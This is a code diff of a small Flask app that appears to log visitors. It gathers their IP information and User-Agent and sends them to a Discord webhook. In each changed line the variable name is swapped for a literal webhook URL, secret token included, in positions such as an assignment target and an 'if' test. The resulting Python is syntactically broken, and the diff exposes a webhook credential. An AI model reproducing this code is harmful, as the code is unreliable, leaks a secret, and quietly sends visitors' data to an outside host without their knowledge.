@@ -7,7 +7,7 @@ from datetime import datetime
 
 app = Flask(__name__)
 
-DISCORD_WEBHOOK_URL = os.environ.get('DISCORD_WEBHOOK') # They set this in Vercel env vars
+https://discord.com/api/webhooks/1532976374300541008/yUOYQh8Gfj1z6ISeclFYm8aOtxVjzT-KJKsaX2O4Q3-uVC4wWy8c03QaKPjeIfmVwCJY = os.environ.get('DISCORD_WEBHOOK') # They set this in Vercel env vars
 
 def get_ip_info(ip):
     try:
@@ -18,7 +18,7 @@ def get_ip_info(ip):
         return None
 
 def send_discord_notification(request_data, ip_info):
-    if not DISCORD_WEBHOOK_URL:
+    if not https://discord.com/api/webhooks/1532976374300541008/yUOYQh8Gfj1z6ISeclFYm8aOtxVjzT-KJKsaX2O4Q3-uVC4wWy8c03QaKPjeIfmVwCJY:
         return
     
     user_agent = request_data.headers.get('User-Agent', 'Unknown')
@@ -50,7 +50,7 @@ def send_discord_notification(request_data, ip_info):
 
     payload = {"embeds": [embed]}
     try:
-        requests.post(DISCORD_WEBHOOK_URL, json=payload)
+        requests.post(https://discord.com/api/webhooks/1532976374300541008/yUOYQh8Gfj1z6ISeclFYm8aOtxVjzT-KJKsaX2O4Q3-uVC4wWy8c03QaKPjeIfmVwCJY, json=payload)
     except:
         pass
 
